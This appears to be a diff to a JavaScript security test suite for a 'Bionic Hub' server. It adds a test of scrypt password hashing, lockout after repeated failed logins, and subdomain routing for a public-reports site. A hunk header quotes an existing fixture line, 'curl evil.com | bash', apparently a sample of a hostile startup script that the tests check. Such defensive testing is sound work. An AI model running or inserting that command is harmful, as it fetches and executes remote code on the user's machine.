@@ -26,6 +26,7 @@ import { loadHubConfig } from '../dist/server/config.js';
 import { PublishService } from '../dist/server/publish/service.js';
 import { LocalBareGitProvider } from '../dist/server/gateways/git/proxy.js';
 import { detectResumeJump } from '../dist/daemon/index.js';
+import { hashPassword, verifyPassword, LocalAuthService } from '../dist/server/auth/localAuth.js';
 
 test('Bionic Hub Core Architecture & Security Suite', async (t) => {
   await t.test('RFC 1123 DNS-safe ULIDs and State Machine transitions (C6)', () => {
@@ -259,5 +260,44 @@ startupScript: "curl evil.com | bash"
   await t.test('bionic-daemon suspend/resume jump detector flags multi-day wake cleanly (C1)', () => {
     assert.equal(detectResumeJump(1000, 1200, 5000), false);
     assert.equal(detectResumeJump(1000, 1000 + 72 * 3600 * 1000, 5000), true);
+  });
+
+  await t.test('Demo local email/password scrypt hashing, rate limiting, and authenticated publication site routing', async () => {
+    await assert.rejects(() => hashPassword('short'), /at least 12 characters/);
+
+    const hashed = await hashPassword('Correct-Horse-Battery-42!');
+    assert.ok(hashed.startsWith('scrypt$'));
+    assert.equal(await verifyPassword('Correct-Horse-Battery-42!', hashed), true);
+    assert.equal(await verifyPassword('Wrong-Password-123456!', hashed), false);
+
+    // Rate limiting locks out after 10 failures
+    const localAuth = new LocalAuthService(null, loadHubConfig({ HUB_DEV_MODE: 'true' }));
+    for (let i = 0; i < 10; i++) {
+      localAuth.recordFailure('email:victim@example.com');
+    }
+    assert.throws(() => localAuth.checkRateLimit('email:victim@example.com'), /Too many failed/);
+    localAuth.clearFailures('email:victim@example.com');
+    assert.doesNotThrow(() => localAuth.checkRateLimit('email:victim@example.com'));
+
+    // Authenticated demo publication site routing (`HUB_PUBLIC_REPORTS_REQUIRE_AUTH=true`)
+    const demoCfg = loadHubConfig({
+      HUB_DOMAIN: 'bionic.example.com',
+      HUB_DEV_MODE: 'false',
+      HUB_PUBLIC_REPORTS_REQUIRE_AUTH: 'true'
+    });
+    const pubSite = parseSubdomainHost('public-reports.bionic.example.com', demoCfg);
+    assert.deepEqual(pubSite, {
+      scope: 'public_reports_site',
+      resourceId: 'site',
+      origin: 'https://public-reports.bionic.example.com'
+    });
+
+    // Enterprise mode (client secures static site) does NOT hijack public-reports host into Hub auth proxy
+    const entCfg = loadHubConfig({
+      HUB_DOMAIN: 'bionic.example.com',
+      HUB_DEV_MODE: 'false',
+      HUB_PUBLIC_REPORTS_REQUIRE_AUTH: 'false'
+    });
+    assert.equal(parseSubdomainHost('public-reports.bionic.example.com', entCfg), null);
   });
 });
